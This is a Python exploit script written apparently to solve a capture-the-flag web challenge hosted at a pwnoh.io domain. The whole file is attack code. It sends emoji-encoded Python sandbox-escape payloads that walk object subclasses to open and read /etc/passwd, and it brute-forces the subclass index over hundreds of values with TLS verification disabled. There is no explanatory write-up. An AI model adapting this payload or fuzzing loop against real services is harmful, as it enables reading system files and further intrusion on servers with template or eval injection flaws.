import requests
import time
import concurrent.futures
import urllib3
import warnings


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
stop_flag = False  # A flag to control stopping the threads


# Target URL and headers
base_url = "https://homecookeds_revenge.challs.pwnoh.io/"
upload_url = f"{base_url}/chef/upload"
download_url_template = f"{base_url}/chef/download/{{}}.meal"

# Set the common headers for your POST request
headers = {"Content-Type": "application/json"}

# Define the base payload and range for fuzzing
base_payload = '🥢 "1"🥚__class__🥚__base__🥚__subclasses__🦀🦞🍎FUZZ🍏🦀\'/etc/passwd\'🦞🥚read🦀🦞 🥢\n\n'
fuzz_range = range(1, 611)  # FUZZ from 1 to 564

# Function to send the request to fuzz
def fuzz_index(fuzz_value):
    payload = {"text": base_payload.replace("FUZZ", str(fuzz_value))}
    try:
        # Send the fuzzing POST request using the json= argument and disabling SSL verification
        response = requests.post(upload_url, headers=headers, json=payload, verify=False)
        if response.status_code == 200:
            json_response = response.json()
            meal_url = json_response.get("url")
            return fuzz_value, meal_url
        else:
            print(f"Error with FUZZ={fuzz_value}: {response.status_code}")
    except Exception as e:
        print(f"Exception during FUZZ={fuzz_value}: {e}")
    return fuzz_value, None

# Function to download and check meal result
def download_and_check_meal(fuzz_value, meal_url):
    try:
        if meal_url:
            download_url = download_url_template.format(
                meal_url.split("/")[-1].split(".")[0]
            )
            # Make the GET request with SSL verification disabled
            response = requests.get(download_url, verify=False)
            if response.status_code == 200:
                meal_content = response.text
                if "Error" not in meal_content:
                    print(f"Valid result found for FUZZ={fuzz_value}, URL: {download_url}")
                    print(f"Meal output: {meal_content}")
                    return meal_content
                else:
                    print(f"FUZZ={fuzz_value}, output: {meal_content}")
            else:
                print(f"Error downloading meal at {download_url}: {response.status_code}")
    except Exception as e:
        print(f"Exception downloading meal for FUZZ={fuzz_value}: {e}")
    return None

# Worker function for each fuzzing thread
def fuzz_worker(fuzz_value):
    fuzz_value, meal_url = fuzz_index(fuzz_value)
    if stop_flag:
        return None
    if meal_url:
        # Download and check the meal
        return download_and_check_meal(fuzz_value, meal_url)
    return None

# Main function for multi-threaded fuzzing
def main():
    # Number of threads to use
    num_threads = 1  # You can adjust this value based on your system's resources
    stop_flag = False  # A flag to control stopping the threads


    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = {executor.submit(fuzz_worker, fuzz_value): fuzz_value for fuzz_value in fuzz_range}

        for future in concurrent.futures.as_completed(futures):
            fuzz_value = futures[future]
            try:
                result = future.result()
                if result:
                    print(f"Success! FUZZ={fuzz_value}")
                    stop_flag = True
                    executor.shutdown(wait=False)
                    break
            except Exception as e:
                print(f"Fuzzing failed for FUZZ={fuzz_value}: {e}")

    print("Fuzzing complete.")

if __name__ == "__main__":
    main()

